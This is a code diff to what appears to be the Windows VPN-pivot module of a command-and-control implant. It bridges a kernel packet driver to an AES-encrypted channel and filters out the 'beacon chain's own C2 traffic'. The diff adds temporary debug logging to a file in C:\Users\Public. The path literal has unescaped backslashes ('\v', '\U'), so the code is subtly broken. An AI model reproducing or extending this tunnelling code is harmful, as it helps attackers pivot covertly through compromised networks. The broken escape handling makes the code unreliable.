@@ -47,6 +47,18 @@
 #define DRV_NDISPROT  2  /* Manual: self-built signed driver (L2 direct I/O) */
 #define DRV_WINDIVERT 3  /* Manual: always use WinDivert (L3 direct I/O) */
 
+/* TEMP DIAGNOSTIC: stage markers (remove after e2e is green) */
+static void vpn_dbg(const char *msg)
+{
+    HANDLE f = CreateFileA("C:\Users\Public\vpn_dbg.txt", FILE_APPEND_DATA, 0, NULL,
+                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (f == INVALID_HANDLE_VALUE) return;
+    DWORD w;
+    WriteFile(f, msg, lstrlenA(msg), &w, NULL);
+    WriteFile(f, "\r\n", 2, &w, NULL);
+    CloseHandle(f);
+}
+
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -1089,23 +1101,29 @@ vpn_main_loop(LPVOID param)
     fd_set readfds;
     struct timeval tv;
 
+    vpn_dbg("main_loop: start");
     /* Ensure we have a kernel driver for frame I/O */
-    if (vpn_ensure_driver() != 0) return 1;
+    if (vpn_ensure_driver() != 0) { vpn_dbg("FAIL ensure_driver"); return 1; }
+    vpn_dbg("ok ensure_driver");
 
     /* Open the packet device (Npcap L2 or WinDivert L3 per driver_mode) */
     adapter_fd = vpn_open_packet_device();
-    if (adapter_fd == INVALID_HANDLE_VALUE) return 1;
+    if (adapter_fd == INVALID_HANDLE_VALUE) { vpn_dbg("FAIL open_device"); return 1; }
+    vpn_dbg("ok open_device");
 
     /* Unpack and apply the pre-compiled BPF filter (loop prevention:
      * excludes the beacon chain's own C2 traffic) */
     bpf_load_from_config();
     vpn_set_filter(adapter_fd);
+    vpn_dbg("ok bpf");
 
     /* Initialize AES */
-    if (vpn_aes_init() != 0) { vpn_close_device(adapter_fd); return 1; }
+    if (vpn_aes_init() != 0) { vpn_dbg("FAIL aes"); vpn_close_device(adapter_fd); return 1; }
+    vpn_dbg("ok aes");
 
     /* Connect the channel */
-    if (channel_init() != 0) { vpn_close_device(adapter_fd); return 1; }
+    if (channel_init() != 0) { vpn_dbg("FAIL channel_init"); vpn_close_device(adapter_fd); return 1; }
+    vpn_dbg("ok channel_init - VPN LOOP RUNNING");
 
     /* Main loop: bridge device <-> channel */
     for (;;) {
